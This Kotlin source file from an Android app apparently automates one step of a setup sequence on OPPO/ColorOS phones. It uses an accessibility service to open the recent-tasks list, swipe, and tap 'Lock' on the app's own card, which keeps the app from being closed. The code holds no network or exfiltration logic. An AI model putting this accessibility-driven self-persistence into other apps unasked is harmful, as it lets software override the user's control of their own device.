package com.storm.safe.rock.service.modules.yw5xud.oppo

import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.auto.entity.UiNode
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay

/**
 * Step 8 -- 最近任务锁定。
 *
 * 打开最近任务列表,找到 app 卡片,横向滑动激活,然后点击"锁定"。
 */
class OppoStep8RecentTaskLock(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: OppoSteps
) {
    companion object {
        private const val TAG = "OppoStep8RecentTaskLock"
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val ctx = steps.ctx
        if (OppoStepCompletionStore.isCompleted(ctx, OppoStepCompletionStore.Keys.STEP8_APPLOCK)) {
            logs.add("[Step 8/9] ⏭ 24h 内已完成,跳过"); return
        }
        if (android.os.Build.VERSION.SDK_INT >= 35) {
            logs.add("[Step 8/9] SDK>=35 跳过(ColorOS 16 多任务待适配)")
            successes.add("[Step 8/9] 跳过")
            return
        }
        val svc = service ?: run { failures.add("[Step 8/9] service=null"); return }
        logs.add("[Step 8/9] ▶ 最近任务锁定开始")

        try {
            val launch = ctx.packageManager.getLaunchIntentForPackage(ctx.packageName)
            launch?.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            launch?.let { ctx.startActivity(it) }
            delay(500L)
        } catch (e: CancellationException) { throw e } catch (_: Exception) {}

        try { svc.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS) } catch (_: Exception) {}
        delay(1200L)

        horizontalSwipeToActivate()
        delay(500L)

        // Call through steps to preserve test override behavior
        val ok = steps.tryLockAppCard(successes, logs)
        if (ok) {
            OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP8_APPLOCK)
        } else {
            failures.add("[Step 8/9] 未能锁定 app 卡片")
        }
    }

    suspend fun horizontalSwipeToActivate() {
        val svc = service ?: return
        val ctx = steps.ctx
        val w = try { (ctx.resources.displayMetrics.widthPixels) } catch (_: Exception) { 1080 }
        val h = try { (ctx.resources.displayMetrics.heightPixels) } catch (_: Exception) { 2400 }
        val fromX = w * 0.8f; val toX = w * 0.2f; val y = h * 0.4f
        try {
            val path = android.graphics.Path().apply { moveTo(fromX, y); lineTo(toX, y) }
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 400)
            val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
            svc.dispatchGesture(gesture, null, null)
        } catch (_: Exception) {}
    }

    suspend fun tryLockAppCard(
        successes: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        val svc = service ?: return false
        val appLabel = steps.appLabel
        val lockTexts = listOf("锁定", "鎖定", "加锁", "Lock", "LOCK", "잠금", "잠그기")
        val alreadyLocked = listOf("解锁", "解鎖", "Unlock", "UNLOCK", "취소 잠금", "잠금 해제",
            "已锁定", "已鎖定", "Locked", "LOCKED")

        repeat(4) {
            val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return@repeat
            val cards = try { root.findAccessibilityNodeInfosByText(appLabel) } catch (_: Exception) { null } ?: emptyList()
            for (card in cards) {
                val cardRoot: AccessibilityNodeInfo =
                    try { card.parent } catch (_: Exception) { null } ?: card
                val cardTexts = OppoPageDetector.collectTexts(cardRoot)
                if (alreadyLocked.any { t -> cardTexts.any { it.contains(t) } }) {
                    successes.add("[Step 8/9] 已锁定($appLabel)")
                    return true
                }
                val moreNodes = try { cardRoot.findAccessibilityNodeInfosByText("更多") } catch (_: Exception) { null } ?: emptyList()
                for (m in moreNodes) {
                    val t = try { m.text?.toString() ?: "" } catch (_: Exception) { "" }
                    val desc = try { m.contentDescription?.toString() ?: "" } catch (_: Exception) { "" }
                    if (t == "更多" || desc == "更多") {
                        UiNode.createRoot(m)?.click(); delay(800L); break
                    }
                }
                for (lt in lockTexts) {
                    val found = try { (svc.rootInActiveWindow ?: root).findAccessibilityNodeInfosByText(lt) } catch (_: Exception) { null } ?: emptyList()
                    for (n in found) {
                        val t = try { n.text?.toString() ?: "" } catch (_: Exception) { "" }
                        if ("解" !in t && "已" !in t) {
                            val clicked = UiNode.createRoot(n)?.click() ?: false
                            if (clicked) {
                                successes.add("[Step 8/9] 锁定按钮点中 '$lt'")
                                return true
                            }
                        }
                    }
                }
            }
            delay(600L)
        }
        return false
    }
}
